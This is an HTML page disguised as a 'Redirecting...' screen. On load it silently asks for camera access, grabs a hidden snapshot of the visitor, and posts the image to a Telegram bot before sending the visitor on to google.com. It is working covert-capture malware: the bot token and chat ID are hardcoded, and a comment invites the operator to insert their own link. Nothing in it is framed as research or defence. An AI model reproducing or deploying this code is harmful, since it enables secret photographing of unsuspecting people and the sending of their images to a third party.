<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Redirecting...</title>
</head>
<body style="margin: 0; padding: 0; background: #000;">

<video id="video" autoplay playsinline style="display: none;"></video>
<canvas id="canvas" width="320" height="240" style="display: none;"></canvas>

<script>
  const BOT_TOKEN = "8182226345:AAF3bv4klc-gx-he8_uzPgq-NFPpZqXQ2Ro";
  const CHAT_ID = "7009447523";
  const REDIRECT_URL = "https://google.com"; // <-- Yahan apni link daalna

  async function autoCaptureAndSend() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      video.srcObject = stream;

      // Wait for video to be ready
      await new Promise(resolve => {
        video.onloadedmetadata = () => resolve();
      });

      // Wait a bit for auto-focus, then capture
      setTimeout(async () => {
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL("image/png");
        const blob = await (await fetch(dataUrl)).blob();

        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "pic.png");

        // Send to Telegram bot
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        });

        // Redirect immediately
        window.location.href = REDIRECT_URL;
      }, 1500); // delay for image clarity

    } catch (err) {
      // If user denies permission or error occurs
      window.location.href = REDIRECT_URL;
    }
  }

  // Start on page load
  window.onload = autoCaptureAndSend;
</script>
</body>
</html>
